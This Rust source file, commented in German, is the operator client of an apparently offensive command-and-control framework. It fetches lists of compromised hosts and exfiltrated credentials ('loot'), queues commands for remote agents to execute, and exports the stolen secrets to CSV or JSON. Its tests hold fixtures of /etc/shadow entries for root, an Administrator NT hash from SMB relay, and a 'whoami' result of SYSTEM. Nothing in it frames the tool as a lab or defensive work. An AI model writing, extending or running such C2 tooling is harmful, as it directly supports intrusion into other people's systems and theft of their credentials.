//! HTTP-Client für die kx-server-API mit TLS und Bearer-Auth.
//!
//! Die Nachrichtentypen stammen aus `kx_core::c2` — der Client liest genau die
//! Struktur, die der Server liefert. Der Transport des Protokolls (TLS-Aufbau,
//! Bearer-Header, URL-Bildung, Status→Fehler) liegt in
//! `kx_core::c2::transport`; dieses Modul ist ein dünner Adapter darüber.

use std::io::Write;
use std::path::Path;

use kx_core::c2::transport::{Transport, TransportError};
use kx_core::c2::{
    CreateTaskRequest, ExfiltratedSecret, Host, Task, PATH_HOSTS, PATH_SECRETS, PATH_TASKS,
    PATH_TASKS_CREATE,
};
use thiserror::Error;

/// Fehler bei API-Requests.
///
/// Die Transportfehler kommen aus `kx_core::c2::transport` — dort steht die
/// einzige Fehlertaxonomie des C2-Protokolls. Was hier bleibt, ist der Fehler
/// der Bedienung: das Schreiben der Exportdatei.
#[derive(Debug, Error)]
pub enum ApiError {
    /// Fehler aus dem C2-Transport.
    #[error(transparent)]
    Transport(#[from] TransportError),
    /// Datei-I/O-Fehler.
    #[error("Datei-I/O-Fehler: {0}")]
    Io(String),
}

/// API-Client — ein Adapter über den Transport aus `kx_core::c2::transport`.
pub struct Client {
    transport: Transport,
}

impl Client {
    /// Erzeugt einen Client für den angegebenen Server.
    pub fn new(server: &str, token: &str, cert: &str) -> Result<Self, ApiError> {
        Ok(Self {
            transport: Transport::from_cert_file(server, token, cert)?,
        })
    }

    /// Liefert alle Hosts.
    pub async fn hosts(&self) -> Result<Vec<Host>, ApiError> {
        Ok(self.transport.get_json(PATH_HOSTS)?)
    }

    /// Liefert alle exfiltrierten Secrets.
    pub async fn secrets(&self) -> Result<Vec<ExfiltratedSecret>, ApiError> {
        Ok(self.transport.get_json(PATH_SECRETS)?)
    }

    /// Liefert alle Tasks.
    pub async fn tasks(&self) -> Result<Vec<Task>, ApiError> {
        Ok(self.transport.get_json(PATH_TASKS)?)
    }

    /// Legt einen Task an und liefert die ID zurueck.
    ///
    /// Der Agent holt den Task ueber `GET /api/tasks` ab, fuehrt ihn aus und
    /// meldet das Ergebnis zurueck.
    pub async fn create_task(&self, req: &CreateTaskRequest) -> Result<String, ApiError> {
        let task: Task = self.transport.post_json_response(PATH_TASKS_CREATE, req)?;
        Ok(task.id)
    }
}

/// Quotiert ein CSV-Feld nach RFC 4180.
///
/// Ein Komma, ein Anführungszeichen oder ein Zeilenumbruch im Wert würde die
/// Spalten verschieben — ein Benutzername wie `a,b` erzeugt sonst eine
/// kaputte Datei, in der jede Zeile eine andere Spaltenzahl hat.
fn csv_feld(wert: &str) -> String {
    if wert.contains([',', '"', '\n', '\r']) {
        format!("\"{}\"", wert.replace('"', "\"\""))
    } else {
        wert.to_string()
    }
}

/// Die Spalten des CSV-Exports.
///
/// Alle Felder des Wire-Typs außer der `id` — die ist eine Serverkennung und
/// im Export des Operators nur Ballast. Die Kopfzeile **und** die Zeilen
/// entstehen aus dieser einen Liste; sie können nicht auseinanderlaufen.
///
/// `sealed_password` gehoert dazu: bei versiegelter Beute ist `password`
/// leer, und ohne die Chiffretext-Spalte wirft der CSV-Export die Beute weg.
const CSV_SPALTEN: &[&str] = &[
    "host_id",
    "cred_type",
    "username",
    "password",
    "sealed_password",
    "source",
    "collected_at",
];

/// Der Wert eines Feldes — die Brücke zwischen Spaltenliste und Zeile.
fn feld_wert<'a>(secret: &'a ExfiltratedSecret, feld: &str) -> &'a str {
    match feld {
        "host_id" => &secret.host_id,
        "cred_type" => &secret.cred_type,
        "username" => &secret.username,
        "password" => &secret.password,
        "sealed_password" => &secret.sealed_password,
        "source" => &secret.source,
        "collected_at" => &secret.collected_at,
        other => panic!("unbekanntes Feld '{other}'"),
    }
}

/// Exportiert Secrets als JSON oder CSV.
///
/// Die Datei entsteht mit Mode 0600: sie kann versiegelte Beute enthalten,
/// und die gehört nicht in eine weltlesbare Datei.
pub fn export(secrets: &[ExfiltratedSecret], path: &Path, format: &str) -> Result<(), ApiError> {
    let mut datei = {
        let mut opts = std::fs::OpenOptions::new();
        opts.write(true).create(true).truncate(true);
        #[cfg(unix)]
        {
            use std::os::unix::fs::OpenOptionsExt;
            opts.mode(0o600);
        }
        opts.open(path).map_err(|e| ApiError::Io(e.to_string()))?
    };
    match format {
        "csv" => {
            writeln!(datei, "{}", CSV_SPALTEN.join(","))
                .map_err(|e| ApiError::Io(e.to_string()))?;
            for s in secrets {
                let zeile: Vec<String> = CSV_SPALTEN
                    .iter()
                    .map(|feld| csv_feld(feld_wert(s, feld)))
                    .collect();
                writeln!(datei, "{}", zeile.join(",")).map_err(|e| ApiError::Io(e.to_string()))?;
            }
        }
        _ => {
            serde_json::to_writer_pretty(&mut datei, secrets)
                .map_err(|e| ApiError::Io(e.to_string()))?;
        }
    }
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn export_writes_csv() {
        let secrets = vec![ExfiltratedSecret {
            id: "1".into(),
            host_id: "h1".into(),
            cred_type: "password".into(),
            username: "admin".into(),
            password: "secret".into(),
            source: "test".into(),
            collected_at: "2025-11-07T00:00:00Z".into(),
            sealed_password: String::new(),
        }];
        let dir = std::env::temp_dir();
        let path = dir.join("kx-cli-test.csv");
        export(&secrets, &path, "csv").unwrap();
        let content = std::fs::read_to_string(&path).unwrap();
        assert!(content.contains("admin"));
        std::fs::remove_file(path).ok();
    }

    /// Der Regressionstest fuer den ausgelieferten Defekt: bei versiegelter
    /// Beute ist `password` leer, und ohne die Chiffretext-Spalte wirft der
    /// CSV-Export die Beute weg.
    #[test]
    fn csv_enthaelt_den_versiegelten_chiffretext() {
        let secrets = vec![ExfiltratedSecret {
            id: "1".into(),
            host_id: "h1".into(),
            cred_type: "shadow".into(),
            username: "root".into(),
            password: String::new(),
            source: "/etc/shadow".into(),
            collected_at: "2026-11-16T00:00:00Z".into(),
            sealed_password: "kx1:AAAABBBB".into(),
        }];
        let dir = std::env::temp_dir();
        let path = dir.join("kx-cli-test-versiegelt.csv");
        export(&secrets, &path, "csv").unwrap();
        let content = std::fs::read_to_string(&path).unwrap();
        let kopf = content.lines().next().unwrap_or_default();
        assert!(
            kopf.contains("sealed_password"),
            "die Chiffretext-Spalte fehlt im Kopf: {kopf}"
        );
        assert!(
            content.contains("kx1:AAAABBBB"),
            "der versiegelte Chiffretext fehlt im Export"
        );
        std::fs::remove_file(path).ok();
    }

    /// Der Erfassungszeitpunkt gehört in den Export.
    ///
    /// Der entschlüsselte Export hat ihn früher verloren: die CLI baute das
    /// Secret in einen zweiten Typ zurück, und der hatte kein `collected_at`.
    /// Die Spalte existierte, der Wert war leer.
    #[test]
    fn csv_traegt_den_erfassungszeitpunkt() {
        let secrets = vec![ExfiltratedSecret {
            id: "1".into(),
            host_id: "h1".into(),
            cred_type: "shadow".into(),
            username: "root".into(),
            password: "hash".into(),
            source: "/etc/shadow".into(),
            collected_at: "2026-11-16T09:30:00Z".into(),
            sealed_password: String::new(),
        }];
        let dir = std::env::temp_dir();
        let path = dir.join("kx-cli-test-zeitpunkt.csv");
        export(&secrets, &path, "csv").unwrap();
        let content = std::fs::read_to_string(&path).unwrap();
        let zeile = content.lines().nth(1).unwrap_or_default();
        assert!(
            zeile.contains("2026-11-16T09:30:00Z"),
            "der Erfassungszeitpunkt fehlt im Export: {zeile}"
        );
        std::fs::remove_file(path).ok();
    }

    /// Die CSV-Spalten sind genau die Felder des Wire-Typs — ohne die `id`.
    ///
    /// Die Liste steht an **einer** Stelle: die Kopfzeile und die Zeilen
    /// entstehen daraus. Der Test vergleicht sie mit dem Typ, damit kein Feld
    /// verloren geht und keines erfunden ist.
    #[test]
    fn die_csv_spalten_sind_die_felder_des_typs_ohne_id() {
        let mut erwartet: Vec<&str> = ExfiltratedSecret::FIELDS
            .iter()
            .copied()
            .filter(|f| *f != "id")
            .collect();
        erwartet.sort_unstable();
        let mut ist = CSV_SPALTEN.to_vec();
        ist.sort_unstable();
        assert_eq!(ist, erwartet, "die CSV-Spalten weichen vom Wire-Typ ab");
    }

    /// Die Kopfzeile nennt genau die Spalten der Liste — in derselben
    /// Reihenfolge.
    #[test]
    fn die_csv_kopfzeile_nennt_die_spalten_der_liste() {
        let secrets = vec![ExfiltratedSecret {
            id: "1".into(),
            host_id: "h1".into(),
            cred_type: "password".into(),
            username: "admin".into(),
            password: "secret".into(),
            source: "test".into(),
            collected_at: "2026-11-16T00:00:00Z".into(),
            sealed_password: String::new(),
        }];
        let dir = std::env::temp_dir();
        let path = dir.join("kx-cli-test-kopf.csv");
        export(&secrets, &path, "csv").unwrap();
        let content = std::fs::read_to_string(&path).unwrap();
        let kopf = content.lines().next().unwrap_or_default();
        assert_eq!(kopf, CSV_SPALTEN.join(","));
        std::fs::remove_file(path).ok();
    }

    /// Ein Komma im Benutzernamen darf die Spalten nicht verschieben.
    #[test]
    fn csv_quotiert_felder_mit_komma() {
        let secrets = vec![ExfiltratedSecret {
            id: "1".into(),
            host_id: "h1".into(),
            cred_type: "password".into(),
            username: "a,b\"c".into(),
            password: "p".into(),
            source: "test".into(),
            collected_at: "2026-11-16T00:00:00Z".into(),
            sealed_password: String::new(),
        }];
        let dir = std::env::temp_dir();
        let path = dir.join("kx-cli-test-komma.csv");
        export(&secrets, &path, "csv").unwrap();
        let content = std::fs::read_to_string(&path).unwrap();
        let zeile = content.lines().nth(1).unwrap_or_default();
        assert!(
            zeile.contains("\"a,b\"\"c\""),
            "das Feld ist nicht quotiert: {zeile}"
        );
        std::fs::remove_file(path).ok();
    }

    /// Der Regressionstest für den ausgelieferten Defekt: der Client muss das
    /// Server-JSON lesen können. Vorher stand hier kein Test — der CLI-Typ
    /// erwartete `output`, der Server sendete `result`, und der Fehler fiel
    /// niemandem auf, weil `output` optional war.
    #[test]
    fn cli_reads_the_task_result_from_server_json() {
        let json = r#"[{"id":"t-1","host_id":"10.0.0.5","command":"whoami","status":"done",
            "result":"nt authority\\system","created_at":"2026-11-11T00:06:00Z"}]"#;
        let tasks: Vec<Task> = serde_json::from_str(json).expect("Server-JSON lesbar");
        assert_eq!(tasks.len(), 1);
        assert_eq!(tasks[0].result, "nt authority\\system");
    }

    /// Und derselbe Weg für Hosts und Secrets — die beiden Typen, die vorher
    /// zwar passen, aber an zwei Stellen getrennt gepflegt wurden.
    #[test]
    fn cli_reads_hosts_and_secrets_from_server_json() {
        let hosts_json = r#"[{"host_id":"10.0.0.5","ip":"10.0.0.5","hostname":"target",
            "os":"Windows","status":"compromised","first_seen":"2026-11-11T00:00:00Z",
            "last_seen":"2026-11-11T00:05:00Z"}]"#;
        let hosts: Vec<Host> = serde_json::from_str(hosts_json).expect("Server-JSON lesbar");
        assert_eq!(hosts[0].host_id, "10.0.0.5");
        assert_eq!(hosts[0].status, "compromised");

        let secrets_json = r#"[{"id":"s-1","host_id":"10.0.0.5","cred_type":"nt_hash",
            "username":"Administrator","password":"hash","source":"smb_relay",
            "collected_at":"2026-11-11T00:05:00Z"}]"#;
        let secrets: Vec<ExfiltratedSecret> =
            serde_json::from_str(secrets_json).expect("Server-JSON lesbar");
        assert_eq!(secrets[0].host_id, "10.0.0.5");
        assert_eq!(secrets[0].cred_type, "nt_hash");
    }
}
